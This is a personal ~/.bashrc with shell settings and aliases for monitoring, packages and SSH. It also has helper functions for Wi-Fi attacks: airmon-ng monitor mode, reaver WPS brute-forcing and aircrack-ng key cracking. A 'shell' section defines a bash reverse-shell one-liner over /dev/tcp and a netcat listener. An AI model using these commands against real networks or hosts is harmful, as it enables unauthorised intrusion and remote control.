# ~/.bashrc

# settings
stty stop ''; stty start '';
setxkbmap -option ctrl:nocaps

# history
shopt -s autocd # Allows cd without cd.
shopt -s checkwinsize # Check window size.
HISTSIZE= HISTFILESIZE= # Infinite history.

# alias
alias ls="ls --color=auto"
alias df="df -Tha --total"
alias free="free -mt"
alias grep="grep --color=auto"
alias code="code ."
alias yayorphan="yay -Qtdq | yay -Rns -"
alias yayskip="yay -S --mflags --skipinteg --sudoloop"
alias yay="yay --sudoloop"
alias cpu-stats="watch -n1 'cat /proc/cpuinfo | grep \"^[c]pu MHz\" && echo ----- && sensors | grep Core && echo ----- && sensors | grep fan'"
alias inhibit="echo Power: && dbus-send --session --print-reply --dest=org.freedesktop.PowerManagement /org/freedesktop/PowerManagement/Inhibit org.freedesktop.PowerManagement.Inhibit.GetInhibitors && echo Screensaver: && dbus-send --session --print-reply --dest=org.xfce.ScreenSaver / org.xfce.ScreenSaver.GetInhibitors" 

# logs
function log-search() { sudo grep -rsh $1 /var/log | sort; }

# connections
alias ssh-connections="sudo netstat -tnpa | grep 'ESTABLISHED.*sshd'"
alias smb-connections="sudo smbstatus -S && sudo smbstatus -L"
function sshc(){ ssh 192.168.100."$1" -p 80"$1"; }

# airmon
alias air-start="sudo airmon-ng start wlp5s0"
alias air-stop="sudo airmon-ng stop wlp5s0mon"
alias air-listen="sudo airodump-ng wlp5s0mon"
function air-wps-new() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w -N "$3"; }
function air-wps-restore() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w -s "$3"; } 
function air-record() { sudo airodump-ng -c "$1" -w ~/archive/pen/capture/data-cap wlp5s0mon; }
function air-decrypt() { sudo aircrack-ng -z "$1" -w "$2"; }

# shell
function shell-connect() { bash -i >& /dev/tcp/"$1"/"$2" 0>&1; }
function shell-listen() { sudo nc -nvlp "$1"; }

# color
PS1='\[\033[01;34m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '

eval "$(starship init bash)"
eval "$(pyenv init -)"
eval "$(fnm env --use-on-cd)"
